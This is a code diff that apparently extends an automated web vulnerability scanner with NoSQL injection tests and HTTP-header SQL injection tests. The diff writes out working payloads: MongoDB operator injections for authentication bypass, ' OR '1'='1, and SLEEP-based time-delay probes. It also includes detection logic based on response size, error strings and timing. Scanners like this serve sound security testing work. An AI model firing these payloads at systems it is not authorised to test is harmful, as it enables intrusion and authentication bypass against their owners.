@@ -452,6 +452,153 @@ async def test_sqli(
     return {"vulnerable": False, "url": target_url, "param": param}
 
 
+async def test_nosql_injection(
+    target_url: str, param: str, original_value: str,
+) -> dict[str, Any]:
+    """Test NoSQL injection (MongoDB $gt, $ne, $regex operators)."""
+    async with aiohttp.ClientSession() as session:
+        baseline_status, baseline_body, _ = await _send(session, target_url)
+        if baseline_status == 0:
+            return {"vulnerable": False, "url": target_url, "param": param}
+
+        baseline_len = len(baseline_body)
+
+        # NoSQL payloads for GET params
+        nosql_payloads = [
+            # MongoDB operator injection
+            ('{"$gt":""}', "mongodb-gt"),
+            ('{"$ne":""}', "mongodb-ne"),
+            ('{"$regex":".*"}', "mongodb-regex"),
+            ('{"$exists":true}', "mongodb-exists"),
+            # NoSQL auth bypass
+            ("' || '1'=='1", "nosql-or"),
+            ('{"$gt": ""}', "mongodb-gt-json"),
+            # Array injection
+            (f"{original_value}[$ne]=", "array-ne"),
+        ]
+
+        for payload, technique in nosql_payloads:
+            test_url = _replace_param(target_url, param, payload)
+            status, body, _ = await _send(session, test_url)
+
+            if status == 0:
+                continue
+
+            # Check for different response (more data returned = operator worked)
+            body_len = len(body)
+            if (body_len > baseline_len + 200
+                    and body != baseline_body
+                    and status == 200):
+                return {
+                    "vulnerable": True,
+                    "url": test_url,
+                    "param": param,
+                    "technique": technique,
+                    "payload": payload,
+                    "evidence": f"NoSQL injection: response size changed from {baseline_len} to {body_len} bytes with {technique} payload",
+                    "confidence": "medium",
+                }
+
+            # Check for MongoDB errors
+            mongo_errors = ["MongoError", "MongoDB", "$err", "errmsg", "bad query",
+                           "SyntaxError", "unterminated string", "Invalid BSON"]
+            for err in mongo_errors:
+                if err in body and err not in baseline_body:
+                    return {
+                        "vulnerable": True,
+                        "url": test_url,
+                        "param": param,
+                        "technique": "nosql-error",
+                        "payload": payload,
+                        "evidence": f"NoSQL error: '{err}' in response after {technique} injection",
+                        "confidence": "high",
+                    }
+
+    return {"vulnerable": False, "url": target_url, "param": param}
+
+
+async def test_header_sqli(
+    target_url: str,
+) -> dict[str, Any]:
+    """Test SQL injection via HTTP headers (X-Forwarded-For, Referer, etc.)."""
+    _INJECTABLE_HEADERS = [
+        "X-Forwarded-For",
+        "X-Forwarded-Host",
+        "X-Real-IP",
+        "Referer",
+        "User-Agent",
+        "X-Client-IP",
+        "X-Originating-IP",
+        "CF-Connecting-IP",
+        "True-Client-IP",
+    ]
+
+    _HEADER_PAYLOADS = [
+        ("'", "single-quote"),
+        ("' OR '1'='1", "or-true"),
+        ("1' AND SLEEP(3)-- -", "time-based"),
+    ]
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Baseline
+            baseline_status, baseline_body, _ = await _send(session, target_url)
+            if baseline_status == 0:
+                return {"vulnerable": False, "url": target_url}
+
+            for header_name in _INJECTABLE_HEADERS:
+                for payload, technique in _HEADER_PAYLOADS:
+                    custom_headers = {header_name: payload}
+
+                    if "SLEEP" in payload:
+                        t_start = time.monotonic()
+                        status, body, _ = await _send(session, target_url, headers=custom_headers)
+                        elapsed = time.monotonic() - t_start
+
+                        if elapsed > 3:
+                            return {
+                                "vulnerable": True,
+                                "url": target_url,
+                                "header": header_name,
+                                "technique": f"header-sqli-{technique}",
+                                "payload": payload,
+                                "evidence": f"Header SQLi via {header_name}: response delayed {elapsed:.1f}s with SLEEP payload",
+                                "confidence": "medium",
+                            }
+                    else:
+                        status, body, _ = await _send(session, target_url, headers=custom_headers)
+                        if status == 0:
+                            continue
+
+                        # Check for SQL errors
+                        if _SQL_ERROR_RE.search(body) and not _SQL_ERROR_RE.search(baseline_body):
+                            return {
+                                "vulnerable": True,
+                                "url": target_url,
+                                "header": header_name,
+                                "technique": f"header-sqli-{technique}",
+                                "payload": payload,
+                                "evidence": f"Header SQLi via {header_name}: SQL error triggered with {technique} payload",
+                                "confidence": "high",
+                            }
+
+                        if status == 500 and baseline_status != 500:
+                            return {
+                                "vulnerable": True,
+                                "url": target_url,
+                                "header": header_name,
+                                "technique": f"header-sqli-{technique}",
+                                "payload": payload,
+                                "evidence": f"Header SQLi via {header_name}: HTTP 500 on quote injection (baseline was {baseline_status})",
+                                "confidence": "medium",
+                            }
+
+    except Exception:
+        pass
+
+    return {"vulnerable": False, "url": target_url}
+
+
 async def test_ssrf(
     target_url: str, param: str, original_value: str,
 ) -> dict[str, Any]:
